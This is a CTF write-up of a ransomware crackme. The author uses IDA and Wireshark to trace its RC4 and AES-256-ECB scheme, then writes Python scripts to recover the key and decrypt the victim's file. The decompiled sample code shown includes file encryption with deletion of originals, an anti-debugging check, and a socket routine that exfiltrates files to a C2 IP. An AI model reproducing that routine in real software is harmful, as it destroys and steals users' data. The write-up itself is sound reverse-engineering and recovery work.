---
title: Ransomware crackme 
date: 2025-10-04 00:31:59 -0700

categories: [CTF]
tags: [RE,C]
media_subpath: 
image: 
  path: "https://i.postimg.cc/y85bTB2Y/u3865889918-Retro-90s-hacker-poster-arcade-style-pixel-padloc-91043796-1765-4514-bd51-7e89f9a771bb-1.png"
---
I use IDA to reverse engineer an executable using multi-stage encryption (AES-256-ECB and RC4). Through static analysis in IDA, identified the encryption flow, extracted encrypted files from PCAP traffic, decrypted the key generator DLL using a hardcoded password, then called the DLL to generate the RC4 key and decrypt the victim's file.

**Challenge Source:** [nukoneZ's Ransomware](https://crackmes.one/crackme/6848e4102b84be7ea77437ba)

## Challenge Information

**Arch:** Windows x86-64  
**Language:** C/C++  
**Description:** A hacker launched a ransomware attack on Lisa's machine, encrypting all critical data in her wallet. Help Lisa recover her lost files!

---

Quick heads up: this writeup walks through a ransomware crackme I had fun with. I go into more detail than the challenge probably needs because I like explaining what I'm doing and why at each step. Some people prefer short, to-the-point guides, but I want this to be very informational and to see my thought process. Also, my original notes were about 3 times longer than this writeup lol.

## Part 1: Initial Reconnaissance

### Files Extracted

When we extract the challenge archive, we get two files:
1. **Click_Me.exe** - The ransomware executable
2. **RecordUser.pcap** - Network traffic capture

### PE Studio Analysis

Next, we examine the binary with PE Studio to get some basic initial clues. 

**Key Imports Found:**

## the imports from PEstudio
<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/0NpmWRVd/lib1.webp" alt="Last minute build" width="400">
</div>

**Cryptography (from libcrypto-3-x64.dll):**
libcrypto-3-x64.dll is the OpenSSL Cryptography library (version 3.x). Presence of OpenSSL immediately tells us that cryptography is involved. For a ransomware challenge, this makes sense.

```
EVP_CIPHER_CTX_free
EVP_CIPHER_CTX_new
EVP_EncryptInit_ex
EVP_EncryptUpdate
EVP_EncryptFinal_ex
EVP_aes_256_ecb
SHA256
```

What this tells us:
- `EVP_aes_256_ecb` indicates AES-256 encryption in ECB mode
- `SHA256` suggests password-based key derivation
- These are OpenSSL's encryption functions

**Network Functions (from WS2_32.dll):**
```
WSAStartup, WSACleanup
socket, connect, send, closesocket
inet_pton, htons
```

This tells us the malware communicates over the network, which is classic C2 (command and control) behavior for ransomware.

**File Operations:**
```
fopen, fread, fwrite, fclose, fseek, ftell, rewind
DeleteFileA
```

The `DeleteFileA` function is sus. 

**Anti-Debugging:**
```
IsDebuggerPresent
```

The malware actively checks if it's being debugged, which is a common anti-analysis technique.

### PCAP Initial Analysis

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/Df5NjRNP/Screenshot-20251003-180653.png" alt="Last minute build" width="400">
<br><em>pcap file stats</em>
</div>

Opening the PCAP in Wireshark, we check the basic statistics:
- **Capture Duration:** 22 seconds
- **Total Packets:** 78 packets
- **Protocol Hierarchy:** Mostly HTTP over TCP, nothing exotic

### Finding Downloaded Files

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/zGMZd4yB/Screenshot-20251003-180526.png" alt="Last minute build" width="400">
<br><em>anonymous file</em>
</div>

We check for HTTP objects: File > Export Objects > HTTP

Found one file named "anonymous" (269 bytes)

My initial hypothesis is that the victim PC communicates with the C2 server to download this file which will serve as an exfiltration method.

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/brTdkqYK/Screenshot-20251003-181822.png" alt="Last minute build" width="400">
</div>

### Examining the First HTTP Request

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/x8yN5K5g/Screenshot-20251003-181657.png" alt="Last minute build" width="400">
</div>

The malware used wget to download "anonymous" from the attacker's server. We save this file for later analysis.

The one stream also contains fake logs. After looking at these for a while I couldn't think of another way this could be useful in the challenge. I think they were just added for fun to fit the whole ransomware vibe.

```
[2025-06-10 09:15:10] [RANSOMWARE] File encryption started
[2025-06-10 09:15:11] [RANSOMWARE] Sensitive file encrypted: wallet_backup.dat
```

---

## Part 2: Static Analysis in IDA

Now we reverse engineer the executable to understand its behavior.

### String Analysis

First step: View > Open Subviews > Strings (Shift+F12)

This gives us a roadmap of what the program does.

**Critical strings found:**

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/dQSbQz9h/Screenshot-20251003-182505.png" alt="Last minute build" width="400">
</div>

```
C:\ProgramData\Important\user.html
C:\ProgramData\Important\user.html.enc
C:\Users\Huynh Quoc Ky\Downloads\Ransomware\libgen.dll
C:\Users\Huynh Quoc Ky\Downloads\Ransomware\hacker
192.168.134.132
hackingisnotacrime
anonymous
gen_from_file
get_result_bytes
Socket creation failed
Connection to server failed
What are you doing ?
```

Initial understanding:
- `user.html` gets encrypted to `user.html.enc` 
- `libgen.dll` is involved, then there is a new file called 'hacker' in the same location
- IP address `192.168.134.132` matches what we saw in PCAP
- "hackingisnotacrime" looks like a password
- "gen_from_file" and "get_result_bytes" are function names

### Anti-Debugging Check

Before examining main, we find this function:

```c
BOOL sub_0021DD_init()
{
  BOOL result;
  
  if ( sub_0021DD() || (result = IsDebuggerPresent()) )
  {
    MessageBoxA(0, "What are you doing ?", "WTF", 0x10u);
    ExitProcess(1u);
  }
  return result;
}
```

This checks if a debugger is attached. If yes, it shows a message box and exits. Since we're doing static analysis in IDA, we can ignore this. For dynamic analysis, you'd patch it or use anti-anti-debugging plugins.

### Main Function

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/k510Vzmd/image.webp" alt="Last minute build" width="400">
</div>

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *Block;
  
  _main();
  Block = sub_001860();
  if ( !Block )
    return -1;
  if ( (unsigned int)sub_001DE1((__int64)Block) || (unsigned int)sub_001FB3() )
  {
    free(Block);
    return -1;
  }
  else
  {
    free(Block);
    return 0;
  }
}
```

**Execution flow:**
1. `sub_001860()` returns a pointer (or NULL on failure)
2. If not NULL, `sub_001DE1(Block)` uses that pointer for something
3. Then `sub_001FB3()` does another operation
4. Cleanup and exit

Let's analyze each function.

### Function 1: sub_001860 (Generating the Key)

```c
void *sub_001860()
{
  void *v1;
  void *Buffer;
  int v3;
  FILE *Stream;
  FARPROC v5;
  FARPROC v6;
  void *Src;
  FARPROC ProcAddress;
  void *Block;
  HMODULE hLibModule;

  hLibModule = LoadLibraryA("C:\\Users\\Huynh Quoc Ky\\Downloads\\Ransomware\\libgen.dll");
  if ( !hLibModule )
    return 0;
    
  Block = malloc(0x20u);  // Allocate 32 bytes 
  if ( !Block )
  {
    FreeLibrary(hLibModule);
    return 0;
  }
```

So far, it loads `libgen.dll` and allocates exactly 32 bytes. This strongly suggests generating a 32-byte key.

**Understanding Windows DLL loading:**
- `LoadLibraryA()` loads a DLL into memory and returns a handle
- `GetProcAddress()` gets a function pointer from the DLL by name
- This lets the malware call functions from the DLL dynamically

Continuing with the function:

```c
  // Method 1: Try calling gen_from_file
  ProcAddress = GetProcAddress(hLibModule, "gen_from_file");
  if ( ProcAddress )
  {
    Src = (void *)((__int64 (__fastcall *)(const char *))ProcAddress)("anonymous");
    if ( Src )
    {
      memcpy(Block, Src, 0x20u);
      FreeLibrary(hLibModule);
      return Block;
    }
  }
  
  // Method 2: Try calling get_result_bytes
  v6 = GetProcAddress(hLibModule, "get_result_bytes");
  if ( v6 && ((int (__fastcall *)(void *, __int64))v6)(Block, 32) > 0 )
  {
    FreeLibrary(hLibModule);
    return Block;
  }
  
  // Method 3: Read anonymous file and call gen()
  v5 = GetProcAddress(hLibModule, "gen");
  if ( v5 )
  {
    Stream = fopen("anonymous", "rb");
    if ( Stream )
    {
      fseek(Stream, 0, 2);  // Seek to end
      v3 = ftell(Stream);   // Get file size
      rewind(Stream);       // Back to start
      if ( v3 > 0 )
      {
        Buffer = malloc(v3);
        if ( Buffer )
        {
          fread(Buffer, 1u, v3, Stream);
          v1 = (void *)((__int64 (__fastcall *)(void *, _QWORD))v5)(Buffer, v3);
          if ( v1 )
          {
            memcpy(Block, v1, 0x20u);
            free(Buffer);
            fclose(Stream);
            FreeLibrary(hLibModule);
            return Block;
          }
          free(Buffer);
        }
      }
      fclose(Stream);
    }
  }
  
  free(Block);
  FreeLibrary(hLibModule);
  return 0;
}
```

**The function tries 3 methods to generate a 32-byte key:**
1. Call `gen_from_file("anonymous")` directly
2. Call `get_result_bytes(buffer, 32)` to fill the buffer
3. Read "anonymous" file, pass contents to `gen()`, get result

Key insight: The "anonymous" file from the C2 server is important because it's used by libgen.dll to generate the encryption key.

Let's rename this function as `generate_rc4_key` (we'll see why it's RC4 soon).

### Function 2: sub_001DE1 (Encrypting the File)

```c
__int64 __fastcall sub_001DE1(__int64 a1)
{
  FILE *v2;
  void *Buffer;
  void *Block;
  int v5;
  FILE *Stream;

  Stream = fopen("C:\\ProgramData\\Important\\user.html", "rb");
  if ( !Stream )
    return 0xFFFFFFFFLL;
    
  fseek(Stream, 0, 2);  // Seek to end
  v5 = ftell(Stream);   // Get file size
  rewind(Stream);       // Back to start
  
  Block = malloc(v5);   // Allocate for input (plaintext)
  Buffer = malloc(v5);  // Allocate for output (ciphertext)
  if ( Block && Buffer )
  {
    fread(Block, 1u, v5, Stream);
    fclose(Stream);
    
    sub_001668(a1, 32, (__int64)Block, (__int64)Buffer, v5);
```

This is the key line. Let me explain the parameters:
- `a1` is the 32-byte key from earlier
- `32` is the key length
- `Block` is the input plaintext data
- `Buffer` is the output ciphertext data
- `v5` is the length of data

Continuing, this is the actual encryption function below. 

```c
    v2 = fopen("C:\\ProgramData\\Important\\user.html.enc", "wb");
    if ( v2 )
    {
      fwrite(Buffer, 1u, v5, v2);
      fclose(v2);
      sub_00183D("C:\\ProgramData\\Important\\user.html");
      free(Block);
      free(Buffer);
      sub_001AEB("C:\\ProgramData\\Important\\user.html.enc");
      return 0;
```

It writes encrypted data to the `.enc` file, then calls two more functions.

**Examining sub_00183D:**
```c
BOOL __fastcall sub_00183D(const CHAR *a1)
{
  return DeleteFileA(a1);
}
```

Looks like it deletes the original file after encrypting it. 

**Examining sub_001AEB (the exfiltration function):**
```c
__int64 __fastcall sub_001AEB(const char *a1)
{
  char buf[4];
  sockaddr name;
  WSAData WSAData;
  SOCKET s;
  void *Buffer;
  int len;
  FILE *Stream;

  Stream = fopen(a1, "rb");
  if ( !Stream )
    return 0xFFFFFFFFLL;
    
  fseek(Stream, 0, 2);
  len = ftell(Stream);
  rewind(Stream);
  Buffer = malloc(len);
  
  if ( Buffer )
  {
    fread(Buffer, 1u, len, Stream);
    fclose(Stream);
    
    WSAStartup(0x202u, &WSAData);  // Initialize Winsock
    s = socket(2, 1, 0);            // Create TCP socket (AF_INET, SOCK_STREAM)
    if ( s == -1 )
    {
      puts("Socket creation failed");
      free(Buffer);
      WSACleanup();
      return 0xFFFFFFFFLL;
    }
    else
    {
      name.sa_family = 2;  // AF_INET = IPv4
      *(_WORD *)name.sa_data = htons(0x22B8u);  // Port number
      inet_pton(2, "192.168.134.132", &name.sa_data[2]);
```

**Converting the port number:** 
`0x22B8` in hex = 8888 in decimal

This matches the port we saw in the PCAP.

```c
      if ( connect(s, &name, 16) >= 0 )
      {
        buf[0] = HIBYTE(len);   // Most significant byte
        buf[1] = BYTE2(len);
        buf[2] = BYTE1(len);
        buf[3] = len;           // Least significant byte
        send(s, buf, 4, 0);     // Send 4-byte length header (big-endian)
        send(s, (const char *)Buffer, len, 0);  // Send file data
        printf("Sent %s (%ld bytes) to server\n", a1, len);
```

**This explains the network protocol:** First, send 4 bytes containing the file size. Then send the actual file data. This matches what we'll see in the PCAP streams.

Let's rename these functions:
- `sub_001DE1` to `encrypt_user_file`
- `sub_00183D` to `delete_original_file`
- `sub_001AEB` to `exfiltrate_to_c2`

### The Core Encryption Function: sub_001668

```c
__int64 __fastcall sub_001668(__int64 a1, int a2, __int64 a3, __int64 a4, unsigned __int64 a5)
{
  __int64 v6;
  _BYTE v7[256];  // 256-byte array!

  sub_00148C(a1, a2, (__int64)(&v6 + 4));
  sub_001558((__int64)v7, a3, a4, a5);
  return 0;
}
```

Key observation: It declares a 256-byte array (`v7`). Encryption algorithms that use 256-byte arrays are a huge hint. This is likely **RC4**.

Let's examine the sub-functions:

### sub_00148C - Identifying RC4 KSA

```c
__int64 __fastcall sub_00148C(__int64 a1, int a2, __int64 a3)
{
  int j;
  int i;
  int v6;

  v6 = 0;
  for ( i = 0; i <= 255; ++i )
    *(_BYTE *)(i + a3) = i;  // Initialize: S = [0, 1, 2, ..., 255]
    
  for ( j = 0; j <= 255; ++j )
  {
    v6 = (*(unsigned __int8 *)(j + a3) + v6 + *(unsigned __int8 *)(j % a2 + a1)) % 256;
    sub_001450((char *)(j + a3), (char *)(a3 + v6));
  }
  return 0;
}
```

### How We Know This is RC4

**Pattern Recognition:**

**1. The 256-byte array:**
- `_BYTE v7[256]` in the parent function
- This is a good clue for me since RC4 uses a 256-byte state array (S-box)

**2. Initialization to sequential values:**
```c
for ( i = 0; i <= 255; ++i )
    *(_BYTE *)(i + a3) = i;
```
This creates: `S = [0, 1, 2, 3, ..., 255]`

This is exactly how RC4's Key Scheduling Algorithm (KSA) starts.

**3. The scrambling pattern with modulo 256:**
```c
for ( j = 0; j <= 255; ++j )
{
  v6 = (S[j] + v6 + key[j % keylen]) % 256;
  swap(S[j], S[v6]);
}
```

Breaking this down:
- Loop exactly 256 times
- Use modulo to wrap key access: `key[j % keylen]`
- Everything modulo 256: `% 256`
- Swap bytes in the array

This is the exact RC4 KSA formula.

### [Comparing with GeeksForGeeks](https://www.geeksforgeeks.org/dsa/implementation-of-rc4-algorithm/)

If we were unsure, we could search something like "initialize array 0 to 255 swap encryption" and find RC4 immediately. This is the google AI response though:

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/SR38JyZy/image.webp" alt="Last minute build" width="400">
</div>

The GeeksForGeeks RC4 page shows the KSA pseudocode:

```
for i from 0 to 255:
    S[i] = i

j = 0
for i from 0 to 255:
    j = (j + S[i] + key[i mod keylength]) mod 256
    swap(S[i], S[j])
```


**Compare this to our decompiled code:**
- Initialize S[i] = i for 0-255 
- j calculation with modulo 256 
- Key indexed with modulo: `key[i % keylength]` 
- Swap operation 

They're identical.

**What is RC4?**
- Stream cipher developed in 1987
- Works by creating a pseudo-random keystream
- XOR keystream with plaintext to get ciphertext
- Same operation for encryption and decryption
- Considered weak by modern standards but still used in CTFs

**The swap function (sub_001450):**
```c
char *__fastcall sub_001450(char *a1, char *a2)
{
  char v3;
  v3 = *a1;
  *a1 = *a2;
  *a2 = v3;
  return a2;
}
```

Simple byte swap: `temp = a; a = b; b = temp;`

Let's rename these:
- `sub_00148C` to `rc4_ksa`
- `sub_001450` to `swap_bytes`

### sub_001558 - Identifying RC4 PRGA

```c
__int64 __fastcall sub_001558(__int64 a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 i;
  int v6;
  int v7;

  v7 = 0;
  v6 = 0;
  for ( i = 0; i < a4; ++i )
  {
    v7 = (v7 + 1) % 256;
    v6 = (v6 + *(unsigned __int8 *)(v7 + a1)) % 256;
    sub_001450((char *)(v7 + a1), (char *)(a1 + v6));
    *(_BYTE *)(a3 + i) = *(_BYTE *)((unsigned __int8)(*(_BYTE *)(v7 + a1) + *(_BYTE *)(v6 + a1)) + a1)
                       ^ *(_BYTE *)(a2 + i);
  }
  return 0;
}
```

**Comparing with GeeksForGeeks RC4 PRGA:**

```
i = 0
j = 0
while generating output:
    i = (i + 1) mod 256
    j = (j + S[i]) mod 256
    swap(S[i], S[j])
    K = S[(S[i] + S[j]) mod 256]
```

**Let's match line by line:**

**Our code:**
```c
v7 = (v7 + 1) % 256;                        // i = (i + 1) mod 256
v6 = (v6 + S[v7]) % 256;                    // j = (j + S[i]) mod 256
swap(S[v7], S[v6]);                         // swap(S[i], S[j])
K = S[(S[v7] + S[v6]) % 256];               // K = S[(S[i] + S[j]) mod 256]
```

This is exactly the RC4 PRGA.The pseudocode from the website matches our decompiled functions.

Let's rename:
- `sub_001558` to `rc4_prga`
- `sub_001668` to `rc4_encrypt`

**Conclusion:** The ransomware encrypts `user.html` with RC4 using a 32-byte key.

### Function 3: sub_001FB3 (Encrypting the DLL)

```c
__int64 sub_001FB3()
{
  FILE *v1;
  int v2;
  void *Block;
  void *Buffer;
  int v5;
  FILE *Stream;

  Stream = fopen("C:\\Users\\Huynh Quoc Ky\\Downloads\\Ransomware\\libgen.dll", "rb");
  if ( !Stream )
    return 0xFFFFFFFFLL;
    
  fseek(Stream, 0, 2);
  v5 = ftell(Stream);
  rewind(Stream);
  
  if ( v5 > 0 && (Buffer = malloc(v5)) != 0 )
  {
    fread(Buffer, 1u, v5, Stream);
    fclose(Stream);
    
    Block = malloc(v5 + 32);
    if ( Block )
    {
      sub_0016E4("hackingisnotacrime");  // Hash the password
      v2 = sub_00171D();                 // Encrypt
      
      if ( v2 > 0 && (v1 = fopen("C:\\Users\\...\\hacker", "wb")) != 0 )
      {
        fwrite(Block, 1u, v2, v1);
        fclose(v1);
        sub_00183D("C:\\Users\\...\\libgen.dll");  // Delete original
        free(Buffer);
        free(Block);
        sub_001AEB("C:\\Users\\...\\hacker");      // Exfiltrate
        return 0;
```

This reads libgen.dll, encrypts it with "hackingisnotacrime" as the key, saves it as "hacker", deletes the original, and sends it to C2. This part really tripped me up because I was really confused as to why this program wanted to exfiltrate the dll. 

**sub_0016E4:**
```c
__int64 __fastcall sub_0016E4(const char *a1)
{
  strlen(a1);
  return SHA256();
}
```

This computes SHA256("hackingisnotacrime"), which will be the AES key.

**sub_00171D:**
```c
__int64 sub_00171D()
{
  __int64 v1;

  v1 = EVP_CIPHER_CTX_new();
  if ( !v1 )
    return 0xFFFFFFFFLL;
    
  EVP_aes_256_ecb();
  if ( (unsigned int)EVP_EncryptInit_ex() == 1
    && (unsigned int)EVP_EncryptUpdate() == 1
    && (unsigned int)EVP_EncryptFinal_ex() == 1 )
  {
    EVP_CIPHER_CTX_free(v1);
    return 0;
  }
  else
  {
    EVP_CIPHER_CTX_free(v1);
    return 0xFFFFFFFFLL;
  }
}
```

This uses OpenSSL to perform AES-256-ECB encryption.

The three encryption calls work together:

- `EVP_EncryptInit_ex()` initializes the encryption with our key and cipher type
- `EVP_EncryptUpdate()` performs the actual encryption on the libgen.dll data
- `EVP_EncryptFinal_ex()` finalizes the encryption and handles any remaining data/padding

Each function returns 1 on success. If all three succeed, the function cleans up with `EVP_CIPHER_CTX_free()` and returns 0 (success). If any step fails, it returns -1 (error). The encrypted result is stored in the Block buffer allocated earlier in the parent function.

Let's rename:
- `sub_001FB3` to `encrypt_and_send_dll`
- `sub_0016E4` to `hash_password_sha256`
- `sub_00171D` to `aes_256_ecb_encrypt`

### Complete Flow Summary

Now we understand what the ransomware does:

1. Download "anonymous" file from C2
2. Load libgen.dll and use it with "anonymous" to generate 32-byte RC4 key
3. Encrypt user.html with RC4, save as user.html.enc
4. Exfiltrate user.html.enc to C2
5. Encrypt libgen.dll with AES-256-ECB (key = SHA256("hackingisnotacrime")), save as "hacker"
6. Exfiltrate "hacker" to C2
7. Delete originals

### The Functions I Renamed for Clarity 

| Original Name | Renamed To | Purpose |
|--------------|-----------|---------|
| `sub_001860` | `generate_rc4_key` | Loads libgen.dll and generates 32-byte RC4 key |
| `sub_001DE1` | `encrypt_user_file` | Encrypts user.html with RC4 |
| `sub_001FB3` | `encrypt_and_send_dll` | Encrypts libgen.dll with AES-256-ECB |
| `sub_001668` | `rc4_encrypt` | Main RC4 encryption wrapper |
| `sub_00148C` | `rc4_ksa` | RC4 Key Scheduling Algorithm |
| `sub_001558` | `rc4_prga` | RC4 Pseudo-Random Generation Algorithm |
| `sub_001450` | `swap_bytes` | Byte swap helper function |
| `sub_00183D` | `delete_original_file` | Wrapper for DeleteFileA |
| `sub_001AEB` | `exfiltrate_to_c2` | Sends encrypted file to C2 server |
| `sub_0016E4` | `hash_password_sha256` | SHA256 hash function |
| `sub_00171D` | `aes_256_ecb_encrypt` | AES-256-ECB encryption |

 we need the actual encrypted files to decrypt them.

### What We Know So Far
- user.html encrypted with RC4
- libgen.dll encrypted with AES-256-ECB (password: "hackingisnotacrime")
- Both encrypted files were sent to C2 server

### What We Need to Do Next
1. Extract encrypted files from PCAP
2. Decrypt libgen.dll using the password
3. Run libgen.dll to generate RC4 key
4. Decrypt user.html with RC4 key

---

## Part 3: Extracting Encrypted Files from PCAP

### The Part Where I Overlooked the PCAP File

Looking at the code, we see:
- `user.html` is encrypted to `user.html.enc`
- `libgen.dll` is encrypted to "hacker"
- Both are sent to the C2 server at 192.168.134.132:8888

The PCAP captured this exfiltration. We can extract the encrypted files from the network traffic. I previously only captured the anonymous file because all I looked at was the exported HTTP objects. 

### Checking TCP Conversations

Statistics > Conversations > TCP shows 4 TCP streams

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/0QM99mBc/image.webp" alt="Last minute build" width="400">
</div>

**TCP Stream 0:** The HTTP download of "anonymous" (we already have this)

**TCP Stream 1:** Follow > TCP Stream shows binary data being uploaded

Looking at the first 4 bytes in hex: `00 00 0A 1C`

Converting: 0x00000A1C = 2588 bytes in decimal

This is the 4-byte length header we saw in the code. The protocol sends file size first, then data.

**TCP Stream 2:** Another upload with even more data

First 4 bytes: `00 00 42 14` = 16916 bytes

### Identifying Which Stream is Which

But wait, how do I know which TCP stream contains what file? I actually spent quite some time on this part.

**Method 1: File Size**

The DLL file is probably going to be much bigger than the user.html file (unless the author made the html really big for some reason lol). Looking at the 4-byte headers:

**TCP Stream 1:** `00 00 0A 1C` = 2,588 bytes (smaller)
**TCP Stream 2:** `00 00 42 14` = 16,916 bytes (much larger)

DLLs are typically larger than HTML files, so Stream 2 is likely the DLL.

**Method 2: Order of Communication**

Looking back at how the malware communicates with the C2 server:

```c
Block = generate_rc4_key();           // Step 1
encrypt_user_file(Block);             // Step 2 - sends user.html.enc
encrypt_and_send_dll();               // Step 3 - sends libgen.dll
```

The user.html is going to be the first file exfiltrated, which is why it's Stream 1 (it's before the libgen.dll exfiltration). The libgen.dll is encrypted and sent afterwards, making it Stream 2.

This order makes sense when you think about it. The malware needs to:
1. Generate the key using libgen.dll
2. Encrypt the victim's file first
3. Then clean up by encrypting and sending its own tools (I still don't understand why it would need to send itself the libgen.dll file but then again it's a crackme lol)

### Extracting the Files

**For user.html.enc (TCP Stream 1):**
1. Right-click packet in stream, Follow > TCP Stream
2. Show data as: Raw
3. Save as: `user.html.enc`

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/Yqy8WWDK/Screenshot-20251003-193338.png" alt="Last minute build" width="400">
</div>

**For encrypted libgen.dll(hacker)  (TCP Stream 2):**
1. Follow > TCP Stream
2. Show data as: Raw
3. Save as: `libgenEncrypt.bin`

<div align="center" style="margin-bottom: 20px;">
<img src="https://i.postimg.cc/k5PQQFxG/Screenshot-20251003-193520.png" alt="Last minute build" width="400">
</div>

Important: These files include the 4-byte header that Wireshark captured from the network stream.

---

## Part 4: Decrypting libgen.dll

### Why We Need to Decrypt the DLL First

Remember the attack flow:
- libgen.dll generates the RC4 key
- But libgen.dll itself was encrypted and sent to C2

We need to decrypt libgen.dll so we can use it to generate the RC4 key. Without the libgen.dll file we can't solve it.

### What We Know About the DLL Encryption

From our static analysis:
- **Algorithm:** AES-256-ECB
- **Password:** "hackingisnotacrime"
- **Key derivation:** SHA256(password)

### Creating the Decryption Script

**decrypt_libgen.py:**

```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from pathlib import Path

# Generate AES key from password
password = b"hackingisnotacrime"
aes_key = SHA256.new(password).digest()
print(f"AES Key (hex): {aes_key.hex()}")

# Read encrypted DLL
raw = Path("libgenEncrypt.bin").read_bytes()
encrypted_dll = raw  # Try without removing header first

print(f"Encrypted DLL size: {len(encrypted_dll)} bytes")

# Decrypt using AES-256-ECB
cipher = AES.new(aes_key, AES.MODE_ECB)
decrypted_dll = cipher.decrypt(encrypted_dll)

# Save
Path("libgen.dll").write_bytes(decrypted_dll)
print("Decrypted libgen.dll saved")
```

### The Error We Hit

Running the script:
```powershell
> python .\decryptLibgen.py
AES Key (hex): 14f137ab39f56d7ae16b70c987bd85b0033fd158a6f010bf926048952264f807
Encrypted DLL size: 16916 bytes
Traceback (most recent call last):
  File "C:\Users\test\Downloads\decryptLibgen.py", line 19, in <module>
    decrypted_dll = cipher.decrypt(encrypted_dll)
ValueError: Data must be aligned to block boundary in ECB mode
```

What this means: AES is a block cipher that operates on fixed-size blocks (16 bytes for AES). The data size must be a multiple of 16 bytes.

16916 bytes / 16 = 1057.25 blocks (not aligned)

The problem: The 4-byte header from the network protocol.

16916 - 4 = 16912 bytes  
16912 / 16 = 1057 blocks exactly (aligned)

### The Fix

**Updated decrypt_libgen.py:**

I could've also just modified this in a hexeditor but I just added it in the script. All it does is skip the first 4 bytes that we saw on the raw data in Wireshark. This took me a while to figure out so I thought I would include this mistake and correction.

```python
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from pathlib import Path

password = b"hackingisnotacrime"
aes_key = SHA256.new(password).digest()
print(f"AES Key (hex): {aes_key.hex()}")

# Read encrypted DLL and skip the first 4 bytes
raw = Path("libgenEncrypt.bin").read_bytes()
encrypted_dll = raw[4:]   # Skip the length header

print(f"Encrypted DLL size (after removing header): {len(encrypted_dll)} bytes")

cipher = AES.new(aes_key, AES.MODE_ECB)
decrypted_dll = cipher.decrypt(encrypted_dll)

Path("libgen.dll").write_bytes(decrypted_dll)
print("Decrypted libgen.dll saved")
```

### Success

```powershell
> python .\decryptLibgen.py
AES Key (hex): 14f137ab39f56d7ae16b70c987bd85b0033fd158a6f010bf926048952264f807
Encrypted DLL size (after removing header): 16912 bytes
Decrypted libgen.dll saved!
```


## Part 5: Extracting the RC4 Key

### Two Approaches

I think we can either:
1. Manually reverse the bytecode in the "anonymous" file (I ain't doing allat)
2. Just run the DLL and let it do the work

Option 2 is much easier.

### Using Python ctypes to Call the DLL

**extract_key.py:**

```python
import ctypes
from pathlib import Path

# Load the decrypted DLL
dll = ctypes.CDLL("./libgen.dll")

# Get the gen_from_file function
gen_from_file = dll.gen_from_file
gen_from_file.restype = ctypes.c_void_p  # Returns pointer
gen_from_file.argtypes = [ctypes.c_char_p]  # Takes string

# Call gen_from_file("anonymous")
result_ptr = gen_from_file(b"anonymous")

if result_ptr:
    # Read 32 bytes from the returned pointer
    rc4_key = ctypes.string_at(result_ptr, 32)
    
    print(f"RC4 Key (hex): {rc4_key.hex()}")
    print(f"RC4 Key (bytes): {rc4_key}")
    
    # Save it
    Path("rc4_key.bin").write_bytes(rc4_key)
    print("RC4 key saved to rc4_key.bin")
else:
    print("Failed to generate key")
```

What this does:
- `ctypes.CDLL()` loads the DLL into Python's process
- `dll.gen_from_file` gets a reference to the function
- `restype` and `argtypes` tell ctypes the function signature
- We call it with `b"anonymous"` (the filename)
- `ctypes.string_at()` reads 32 bytes from the returned pointer

### Success

```
> python .\rundll.py
RC4 Key (hex): 72346e73306d774072455f63346e5f643335377230795f66316c33735f6e3077
RC4 Key (bytes): b'r4ns0mw@rE_c4n_d357r0y_f1l3s_n0w'
RC4 key saved to rc4_key.bin
```

`r4ns0mw@rE_c4n_d357r0y_f1l3s_n0w`

---

## Part 6: Decrypting user.html

### Now We Have Everything

- RC4 key: `r4ns0mw@rE_c4n_d357r0y_f1l3s_n0w`
- Encrypted file: `user.html.enc` (extracted from PCAP)
- Algorithm: RC4

### Understanding RC4's Encryption/Decryption Symmetry

Back in Part 2, we identified RC4 by recognizing its KSA and PRGA patterns in the assembly code. Now we need to understand a crucial property of RC4: **encryption and decryption are the exact same operation**.

**The XOR Property:**

```
If:     A XOR B = C
Then:   C XOR B = A
```

XOR is its own inverse. If you XOR something twice with the same value, you get back the original.

**How RC4 uses this:**

```
Encryption:  plaintext  XOR keystream = ciphertext
Decryption:  ciphertext XOR keystream = plaintext
```

As long as you use the same key (which generates the same keystream), you can encrypt or decrypt by running the same algorithm.

With RC4, there's no separate decryption function, you just run the same algorithm again.

### Implementing RC4 in Python

We already analyzed how RC4 works from the assembly code in Part 2. Now let's implement those same KSA and PRGA algorithms in Python:

**decrypt_user_file.py:**

```python
from pathlib import Path

def rc4_ksa(key):
    """RC4 Key Scheduling Algorithm - Initialize S-box"""
    key_length = len(key)
    S = list(range(256))  # S = [0, 1, 2, ..., 255]
    j = 0
    
    for i in range(256):
        j = (j + S[i] + key[i % key_length]) % 256
        S[i], S[j] = S[j], S[i]  # Swap
    
    return S

def rc4_prga(S, data):
    """RC4 Pseudo-Random Generation - Generate keystream and decrypt"""
    i = 0
    j = 0
    output = bytearray()
    
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]  # Swap
        K = S[(S[i] + S[j]) % 256]
        output.append(byte ^ K)  # XOR with keystream
    
    return bytes(output)

def rc4_decrypt(key, ciphertext):
    """Full RC4 decryption"""
    S = rc4_ksa(key)
    return rc4_prga(S, ciphertext)

# Read the RC4 key we extracted
rc4_key = Path("rc4_key.bin").read_bytes()
print(f"RC4 Key: {rc4_key.hex()}")

# Read encrypted file (skip 4-byte header)
encrypted_data = Path("user.html.enc").read_bytes()

if len(encrypted_data) > 4:
    file_size = int.from_bytes(encrypted_data[:4], 'big')
    if file_size == len(encrypted_data) - 4:
        encrypted_data = encrypted_data[4:]  # Remove header
        print(f"Removed 4-byte header, file size: {len(encrypted_data)}")

# Decrypt using RC4
decrypted_data = rc4_decrypt(rc4_key, encrypted_data)

# Save result
Path("user.html").write_bytes(decrypted_data)
print("Decrypted user.html saved")
```

The code implements the same KSA and PRGA logic we identified in Part 2, just translated into Python.

### Final Decryption

```
> python .\DecryptHTML.py
RC4 Key: 72346e73306d774072455f63346e5f643335377230795f66316c33735f6e3077
